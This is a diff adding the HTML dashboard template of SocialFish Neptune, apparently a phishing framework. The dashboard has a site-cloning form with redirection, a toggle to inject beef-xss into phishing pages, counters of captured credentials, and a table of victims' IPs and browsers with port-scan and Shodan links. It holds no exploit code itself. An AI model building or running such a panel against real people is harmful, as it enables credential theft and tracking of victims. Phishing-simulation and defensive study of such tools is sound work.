@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- Required meta tags-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="SocialFish">
+    <meta name="author" content="UndeadSec">
+    <meta name="keywords" content="SocialFish">
+
+    <!-- Title Page-->
+    <title>SocialFish Neptune</title>
+
+    <!-- Fontfaces CSS-->
+    <link href="/css/font-face.css" rel="stylesheet" media="all">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+    <link href="/vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">
+
+    <!-- Bootstrap CSS-->
+    <link href="/vendor/bootstrap-4.1/bootstrap.min.css" rel="stylesheet" media="all">
+
+    <!-- Main CSS-->
+    <link href="/css/theme.css" rel="stylesheet" media="all">
+
+</head>
+
+<body class="animsition">
+
+    <!-- BEGIN SHOW/HIDE JS -->
+<script>
+
+function toggleCustom() {
+    if (document.getElementById('status').value != 'custom'){
+        document.getElementById('status').value = 'custom';    
+    }else{
+        document.getElementById('status').value = 'clone';
+    }
+    
+    if (document.getElementById('clone').disabled){
+        document.getElementById('clone').disabled = false;        
+    }else{
+        document.getElementById('clone').disabled = true;
+    }
+}
+
+function toggleBeef() {
+    if (document.getElementById('beef').value != 'yes'){
+        document.getElementById('beef').value = 'yes';    
+    }else{
+        document.getElementById('beef').value = 'no';
+    }
+}
+
+</script>
+
+    <div class="page-wrapper">
+
+        <!-- PAGE CONTENT-->
+        <div class="page-content--bgf7">
+            <!-- BREADCRUMB-->
+            <section class="au-breadcrumb2">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="au-breadcrumb-content">                                
+                                <div class="au-breadcrumb-left">                                    
+                                    <span class="au-breadcrumb-span">Your attacks url:</span>
+                                    <ul class="list-unstyled list-inline au-breadcrumb__list">                                        
+                                        <li class="list-inline-item"><a href="http://0.0.0.0:5000" target="_blank" rel="nofollow"><b> http://0.0.0.0:5000</b></a></li>
+                                    </ul>
+                                </div>                                
+                                <form class="au-form-icon--sm" action="/configure" method="POST">
+                                    <input class="au-input--w300 au-input--style2" name="url" id="clone" type="text" placeholder="Clone" autocomplete="off" required="">
+                                    <input class="au-input--w300 au-input--style2" name="red" type="text" placeholder="Redirection" autocomplete="off" required="">
+                                    <input type="hidden" name="beef" id="beef" value="no">                                    
+                                    <input type="hidden" name="status" id="status" value="clone">
+                                    <button class="au-btn--submit2" type="submit">
+                                        <i class="zmdi zmdi-flash"></i>
+                                    </button>
+                                </form>                                                       
+                            </div>
+                            <div style="text-align: right; margin-top: 30px;">
+                                <small>Custom HTML</small> 
+                                <label class="switch switch-text switch-info switch-pill">
+                                  <input type="checkbox" class="switch-input" onclick="toggleCustom()">
+                                  <span data-on="On" data-off="Off" class="switch-label"></span>
+                                  <span class="switch-handle"></span>
+                                </label>         
+                                <small> Inject beef-xss</small> 
+                                <label class="switch switch-text switch-info switch-pill">
+                                  <input type="checkbox" class="switch-input" onclick="toggleBeef()">
+                                  <span data-on="On" data-off="Off" class="switch-label"></span>
+                                  <span class="switch-handle"></span>
+                                </label>         
+                            </div>                            
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- END BREADCRUMB-->
+
+            <!-- WELCOME-->
+            <section class="welcome p-t-10">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <h4 class="title-4">Easy Access</h4>  
+                            <img src="/token/qrcode.svg" /><br>                          
+                            <small>Your App Token: <b>{{tokenapi}}</b>
+                            <form action="/revokeToken" method="POST">
+                                <div style="color: red">
+                                    <input type="hidden" name="revoke" value="yes">
+                                    <button type="submit" style="color: red;"><i class="fas fa-exchange-alt"></i> Revoke Token</button>
+                                </div>
+                                <a href="https://github.com/UndeadSec/SocialFishMobile" target="_blank" rel="nofollow"><i class="fas fa-mobile-alt"></i> Control SocialFish via mobile app</a></small>
+                            </form>
+                            <div style="text-align: right;">                        
+                                <button type="button" class="btn btn-primary" style="margin: 2px;" onclick="location.href='/mail'"><i class="fas fa-envelope"></i>&nbsp; Send Mail</button>
+                                <button type="button" class="btn btn-info" style="margin: 2px;" onclick="location.href='/report'"><i class="fas fa-file-alt"></i>&nbsp; Generate Report <small> BETA</small></button>
+                            </div>                            
+                            <hr class="line-seprate">
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- END WELCOME-->
+
+            <!-- STATISTIC-->
+            <section class="statistic statistic2">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-6 col-lg-3">
+                            <div class="statistic__item statistic__item--green">
+                                <h2 class="number">{{clicks}}</h2>
+                                <span class="desc">clicks</span>
+                                <div class="icon">
+                                    <i class="zmdi zmdi-mouse"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-lg-3">
+                            <div class="statistic__item statistic__item--orange">
+                                <h2 class="number">{{countNotPickedUp()}}</h2>
+                                <span class="desc">visitors not picked up</span>
+                                <div class="icon">
+                                    <i class="zmdi zmdi-mood-bad"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-lg-3">
+                            <div class="statistic__item statistic__item--blue">
+                                <h2 class="number">{{countCreds()}}</h2>
+                                <span class="desc">captured credentials</span>
+                                <div class="icon">
+                                    <i class="zmdi zmdi-calendar-note"></i>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-6 col-lg-3">
+                            <div class="statistic__item statistic__item--red">
+                                <h2 class="number">{{attacks}}</h2>
+                                <span class="desc">attacks launched</span>
+                                <div class="icon">
+                                    <i class="zmdi zmdi-fire"></i>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- END STATISTIC-->
+
+            <!-- DATA TABLE-->
+            <section class="p-t-20">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <h3 class="title-5 m-b-35">Successful attacks</h3>                            
+                            <div class="table-responsive table-responsive-data2">
+                                <table class="table table-data2">
+                                    <thead>
+                                        <tr>                                                                                
+                                            <th>url</th>
+                                            <th>ip</th>
+                                            <th>browser</th>
+                                            <th>operating system</th>
+                                            <th>date</th>
+                                            <th>port scan</th>
+                                            <th>post log</th>                                            
+                                        </tr> 
+                                    </thead>
+                                    <tbody>
+                                        {% for item in data %}  
+
+                                        <tr class="tr-shadow">                                                                                
+                                            <td><span class="block-email">{{item[1].replace('http://','').replace('https://', '')[:30]}}</span></td>
+                                            <td>{{item[6]}}
+                                                <a href="trace/{{item[6]}}" target="_blank" rel="nofollow">
+                                                <button type="button"><small><i class="fas fa-eye"></i> TRACE</small></button>
+                                                </a>
+                                            </td>
+                                            <td>
+                                            {% if item[3] in 'chrome safari firefox opera' %}
+                                                <i class="fab fa-{{item[3]}}"></i> {{item[3]}} v{{item[4]}}
+                                            {% else %}
+                                                {{item[4]}} v{{item[5]}}
+                                            {% endif %}
+                                            </td>                                                  
+                                            <td>
+                                                {% if 'iphone' in item[5] or 'ipad' in item[5] %}
+                                                    <i class="fab fa-apple"></i> {{item[5]}}
+                                                {% else %}
+                                                    <i class="fab fa-{{item[5]}}"></i> {{item[5]}}
+                                                {% endif %}
+                                            </td>
+                                            <td><i class="far fa-calendar-alt"></i> {{item[2]}}</td>                                             
+                                            <td>
+                                                <a href="scansf/{{item[6]}}" target="_blank" rel="nofollow">
+                                                    <button type="button"><i class="fas fa-bullseye"></i> Scan  </button>
+                                                </a>
+                                                <a href="https://www.shodan.io/host/{{item[6]}}" target="_blank" rel="nofollow">
+                                                    <button type="button"><i class="fas fa-spider"></i> Shodan</button>
+                                                </a>                                                
+                                            </td>                          
+                                            <td>
+                                                <a href="single/{{item[0]}}" target="_blank" rel="nofollow">
+                                                    <button type="button"><i class="fas fa-search"></i> View</button>
+                                                </a>
+                                            </td>
+                                        </tr>                                        
+                                        <tr class="spacer"></tr>
+                                        {% endfor %}
+                                    </tbody>
+                                </table>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- END DATA TABLE-->
+
+            <!-- COPYRIGHT-->
+            <section class="p-t-60 p-b-20">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <div class="copyright">
+                                <p>Copyright © 2019 UndeadSec. All rights reserved.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            <!-- END COPYRIGHT-->
+        </div>
+
+    </div>
+
+    <!-- Jquery JS-->
+    <script src="/vendor/jquery-3.2.1.min.js"></script>
+    <!-- Bootstrap JS-->
+    <script src="/vendor/bootstrap-4.1/popper.min.js"></script>
+    <script src="/vendor/bootstrap-4.1/bootstrap.min.js"></script>
+</body>
+
+</html>
+<!-- end document-->
